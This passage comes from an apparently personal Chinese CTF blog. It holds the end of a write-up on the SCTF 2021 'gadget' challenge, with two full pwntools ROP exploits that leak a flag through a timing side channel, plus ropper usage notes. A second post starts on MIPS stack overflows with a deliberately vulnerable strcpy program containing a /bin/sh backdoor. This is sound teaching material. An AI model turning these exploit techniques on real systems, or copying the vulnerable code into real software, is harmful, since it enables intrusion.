ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    gdb.attach(sh,<span class="string">&quot;b *0x0000000000409d1c&quot;</span>)</span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(push_rsi_ret)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    start=time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        end=time.time()</span><br><span class="line">        asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">         pwn(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="运行效果-跑了快一个小时"><a href="#运行效果-跑了快一个小时" class="headerlink" title="运行效果(跑了快一个小时)"></a>运行效果(跑了快一个小时)</h2><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119231414100.png" alt="image-20220119231414100"></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119231430907.png" alt="image-20220119231430907"></p>
<p>拼接得到flag</p>
<h2 id="工具介绍–ropper"><a href="#工具介绍–ropper" class="headerlink" title="工具介绍–ropper"></a>工具介绍–ropper</h2><p>专门用来找gadget的工具，大部分时间比ROPgadget好用</p>
<p>启动并载入程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ ropper</span><br><span class="line"><span class="meta">(ropper)&gt;</span><span class="bash"> file ./gadget</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] File loaded.</span><br></pre></td></tr></table></figure>

<p>搜索的时候可以直接搜自己想要的gadget,也可以使用search+gadget,模糊搜索的时候可以使用？，如下图</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Searching for gadgets: pop rdi</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop r?i</span></span><br><span class="line">[INFO] Searching for gadgets: pop r?i</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line">0x0000000000407ca5: pop rsi; mov eax, 0xca; mov rdi, r9; syscall; </span><br><span class="line">0x0000000000402be2: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000401732: pop rsi; pop r15; pop rbp; ret; </span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h3><p>思路一般大家都能想到，但在不能shellcode的话最重要的就是寻找合适的gadget来构造攻击链了。gadget一般是利用栈进行值的传递然后调用函数，根据这个特性我把gadget分为四类</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">第一类利用pop传值</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop|ret</span></span><br><span class="line">[INFO] Searching for gadgets: pop|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x000000000040288d: pop r12; pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040172f: pop r12; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040288f: pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000402be1: pop r14; pop r15; jmp rax; </span><br><span class="line"></span><br><span class="line">第二类利用mov传值（这道题就用到了）</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search mov|ret</span></span><br><span class="line">[INFO] Searching for gadgets: mov|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000404cbb: mov ah, 0x86; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x8cbe; </span><br><span class="line">0x000000000040150c: mov ah, 0x8a; push rbp; fdivrp st(6); ret 0xf01; </span><br><span class="line">0x00000000004020f9: mov al, 0x40; add byte ptr [rsi + 0x8002], bh; syscall; </span><br><span class="line">0x000000000040213e: mov al, 0x94; je 0x2151; mov byte ptr [rbx + 0xb2353d], 0; or cl, byte ptr [rdi]; pushfq; ret 0x43bf; </span><br><span class="line"></span><br><span class="line">第三类利用寄存器加call函数调用</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search call r??</span></span><br><span class="line">[INFO] Searching for gadgets: call r??</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000402c0a: call r14; mov edi, eax; call 0x1010; ret; </span><br><span class="line">0x0000000000402c0b: call rsi; </span><br><span class="line">0x0000000000402c0b: call rsi; mov edi, eax; call 0x1010; ret; </span><br><span class="line">第四类系统调用，一般形式是syscall;ret 或者int80;ret</span><br><span class="line">x0000000000401165: syscall; pop rbp; ret; </span><br><span class="line">0x0000000000408865: syscall; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search int 0x80</span></span><br><span class="line">[INFO] Searching for gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x00000000004011f3: int 0x80; </span><br><span class="line">0x00000000004011f3: int 0x80; ret; </span><br></pre></td></tr></table></figure>

<p>rop的时候就搜索这四类就好了。</p>
<h2 id="不利用alarm进行侧信道爆破"><a href="#不利用alarm进行侧信道爆破" class="headerlink" title="不利用alarm进行侧信道爆破"></a>不利用alarm进行侧信道爆破</h2><p>在单线程的情况下使用alarm进行侧信道爆破十分之慢，上面我写的那个脚本要跑出全部的flag大概需要快一个小时，尝试跑了一下别人的利用gadget进行爆破速度快多了，所以打算学习一波。</p>
<p>侧信道的精髓就是不同的比较结果会影响程序流，我么可以使用脚本探测程序流的状况，从而达到推测比价结果得到flag。</p>
<p>问了ayoung佬他的gadget，在初期理解上出现了一点问题，我一直没搞懂cmp以后的比较结果到底体现在哪里，动态调试以后才搞懂体现在cmovnz指令上，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmp     rax, [r15+38h]</span><br><span class="line">mov     eax, 0CD2CFCA4h</span><br><span class="line">mov     ecx, 0DF6F8009h</span><br><span class="line">cmovnz  eax, ecx</span><br><span class="line">jmp     loc_409269</span><br></pre></td></tr></table></figure>

<p>当cmp不相等的时候ecx传值给eax，相等的时候不传值，这两个寄存器对后面的程序流有影响，相等的时候程序陷入循环，不相等的时候程序报错退出可以用recv()对程序状态进行检测。</p>
<p>我的脚本是基于我原先脚本修改的（懒），由于改的有点问题，导致我对程序的rop控制出现了问题，多次动态调试才找见文件，哎。浪费了一下午。下面就是缝缝补补的脚本了。速度虽然快了但是成功率不是很高🤦‍♀️，应该跟我频繁的使用red函数有关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num,ans</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(num)+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">chr</span>(ans)</span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b *0x408F72&quot;)</span></span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(pop_rsi_r15_rbp)+p64(<span class="number">0</span>)+p64(bss_base-<span class="number">0x38</span>+num)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(ans)+p64(<span class="number">0x408F72</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(ans)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>+flag</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>,<span class="number">0x7f</span>):</span><br><span class="line">            s=pwn(i,m)</span><br><span class="line">            <span class="keyword">if</span> s==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">mips初体验</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-17 16:07:28 / 修改时间：16:08:11" itemprop="dateCreated datePublished" datetime="2022-01-17T16:07:28+08:00">2022-01-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mips栈溢出"><a href="#mips栈溢出" class="headerlink" title="mips栈溢出"></a>mips栈溢出</h1><p>mips函数调用：x86函数调用时都是把范湖地址放在栈内，函数执行完再通过返回地址执行下一条指令，mips的函数调用和x86有些像又有些不像，在mips程序中，函数分为叶子函数和非叶子函数，对应数据结构中的树，叶子函数指不在调用函数的函数，非叶子函数指函数内部又调用了其他函数的函数，两种函数对返回值的处理是不一样的，当调用叶子函数时，会直接把返回地址储存在$ra寄存器中，调用非叶子函数时，$ra储存着函数的返回地址，在函数初始部分会直接把$ra的地址入栈，当执行完这个函数时再找到地址返回对应指令。</p>
<h2 id="举例一"><a href="#举例一" class="headerlink" title="举例一"></a>举例一</h2><p>源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">has_stack</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> dst[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(dst,src);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;copy successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先进行编译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">mipsel-linux-gcc vuln -static(指静态绑定，不使用共享库)</span></span><br></pre></td></tr></table></figure>

<p>file查看一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell$ file vuln</span><br><span class="line">vuln: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>

<p>可见成功编译</p>
<p>然后拖入ida查看他的汇编代码</p>
<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00400490                 addiu   $sp, -0x20</span><br><span class="line">.text:00400494                 sw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00400498                 sw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:0040049C                 move    $fp, $sp</span><br><span class="line">.text:004004A0                 sw      $a0, 0x20+arg_0($fp)</span><br><span class="line">.text:004004A4                 sw      $a1, 0x20+arg_4($fp)</span><br><span class="line">.text:004004A8                 lw      $v0, 0x20+arg_4($fp)</span><br><span class="line">.text:004004AC                 addiu   $v0, 4</span><br><span class="line">.text:004004B0                 lw      $v0, 0($v0)</span><br><span class="line">.text:004004B4                 move    $a0, $v0</span><br><span class="line">.text:004004B8                 jal     has_stack</span><br><span class="line">.text:004004BC                 nop</span><br><span class="line">.text:004004C0                 nop</span><br><span class="line">.text:004004C4                 move    $sp, $fp</span><br><span class="line">.text:004004C8                 lw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:004004CC                 lw      $fp, 0x20+var_8($sp)</span><br><span 